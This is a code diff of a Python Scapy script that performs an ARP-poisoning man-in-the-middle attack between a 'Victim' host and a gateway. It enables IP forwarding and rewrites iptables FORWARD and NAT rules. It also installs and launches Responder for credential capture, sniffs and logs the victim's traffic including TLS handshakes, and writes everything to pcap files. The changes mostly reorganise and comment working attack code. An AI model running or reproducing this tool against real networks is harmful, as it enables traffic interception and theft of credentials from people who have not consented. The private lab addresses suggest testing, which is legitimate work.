@@ -1,16 +1,17 @@
+#!/usr/bin/env python3
 from scapy.all import *
 import subprocess
 import shutil
 import os
-import signal
 import sys
 import time
 import threading
 
-from scapy.layers.inet import TCP, UDP, IP
-from scapy.layers.l2 import ARP, Ether
+# For TLS detection
 from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
 from scapy.layers.tls.record import TLS
+from scapy.layers.inet import IP, TCP, UDP
+from scapy.layers.l2 import ARP, Ether
 
 # -------- Configuration --------
 host1_ip = "192.168.100.101"  # Victim
@@ -68,7 +69,6 @@ def poison_arp(victim_ip, victim_mac, spoof_ip, attacker_mac):
     packet = ether / arp
     sendp(packet, iface=interface, verbose=False)
 
-
 def restore_arp(target_ip, target_mac, source_ip, source_mac):
     ether = Ether(dst=target_mac, src=source_mac)
     arp = ARP(op=2, hwsrc=source_mac, psrc=source_ip,
@@ -76,24 +76,25 @@ def restore_arp(target_ip, target_mac, source_ip, source_mac):
     packet = ether / arp
     sendp(packet, iface=interface, count=5, inter=1, verbose=False)
 
-
-def enable_ip_forwarding():
-    print("[*] Enabling IP forwarding")
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
-def disable_ip_forwarding():
-    print("[*] Disabling IP forwarding")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-
-def configure_routing(interface):
-    print("[*] Enabling IP forwarding and configuring NAT...")
+# -------- IP Forwarding + NAT/Forward Rules --------
+def configure_routing(iface):
+    print("[*] Enabling IP forwarding and configuring NAT + FORWARD rules...")
     os.system("sysctl -w net.ipv4.ip_forward=1")
-    os.system(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE")
+    # Accept all forwarded traffic
+    os.system("iptables -P FORWARD ACCEPT")
+    # Flush existing FORWARD rules
+    os.system("iptables -F FORWARD")
+    # Optionally flush NAT (to avoid duplicates)
+    os.system("iptables -t nat -F POSTROUTING")
+    # Add a MASQUERADE rule if you want NAT
+    os.system(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
 
-def disable_routing(interface):
-    print("[*] Disabling IP forwarding and cleaning up NAT...")
+def disable_routing(iface):
+    print("[*] Disabling IP forwarding and cleaning up NAT + FORWARD rules...")
     os.system("sysctl -w net.ipv4.ip_forward=0")
-    os.system(f"iptables -t nat -D POSTROUTING -o {interface} -j MASQUERADE || true")
+    os.system("iptables -t nat -F POSTROUTING")
+    os.system("iptables -F FORWARD")
+    os.system("iptables -P FORWARD DROP")
 
 # -------- Sniffing & Protocol Detection --------
 def identify_protocol(packet):
@@ -148,6 +149,7 @@ def sniff_and_log(filter_ips):
         if IP in packet:
             src = packet[IP].src
             dst = packet[IP].dst
+            # We only log if either IP is the victim or gateway
             if src in filter_ips or dst in filter_ips:
                 proto = identify_protocol(packet)
                 key_event = is_key_exchange(packet)
@@ -162,36 +164,52 @@ def sniff_and_log(filter_ips):
 
 # -------- Main --------
 def main():
+    # 1. Check & Install Responder
     check_and_install_responder()
+
+    # 2. Start Responder
     start_responder()
+
+    # 3. Get MACs
     host1_mac = get_mac(host1_ip)
     host2_mac = get_mac(host2_ip)
-
     if not host1_mac or not host2_mac:
         print("[-] Could not resolve MACs. Exiting.")
         stop_responder()
         sys.exit(1)
 
-    enable_ip_forwarding()
-
-    sniff_thread = threading.Thread(target=sniff_and_log, args=([host1_ip, host2_ip],), daemon=True)
-    sniff_thread.start()
-
+    # 4. Configure IP forwarding, NAT, and FORWARD rules
     configure_routing(interface)
+
+    # 5. Start Sniffing in background
+    sniff_thread = threading.Thread(
+        target=sniff_and_log,
+        args=([host1_ip, host2_ip],),
+        daemon=True
+    )
+    sniff_thread.start()
 
     print("[*] Beginning ARP poisoning. Press CTRL+C to stop.")
     try:
         attacker_mac = get_if_hwaddr(interface)
         while True:
-            poison_arp(host1_ip, host1_mac, host2_ip, attacker_mac)  # Tell host1 that we are the gateway
-            poison_arp(host2_ip, host2_mac, host1_ip, attacker_mac)  # Tell gateway that we are host1
+            # Poison both directions
+            poison_arp(host1_ip, host1_mac, host2_ip, attacker_mac)
+            poison_arp(host2_ip, host2_mac, host1_ip, attacker_mac)
             time.sleep(2)
+
     except KeyboardInterrupt:
         print("\n[!] Cleaning up...")
+
+    finally:
+        # 6. Restore ARP
         restore_arp(host1_ip, host1_mac, host2_ip, host2_mac)
         restore_arp(host2_ip, host2_mac, host1_ip, host1_mac)
+        # 7. Disable NAT & FORWARD
         disable_routing(interface)
+        # 8. Stop Responder
         stop_responder()
+        # 9. Save PCAP files
         wrpcap(capture_file, packets)
         wrpcap(key_file, key_packets)
         print(f"[+] Full packet capture saved to: {capture_file}")
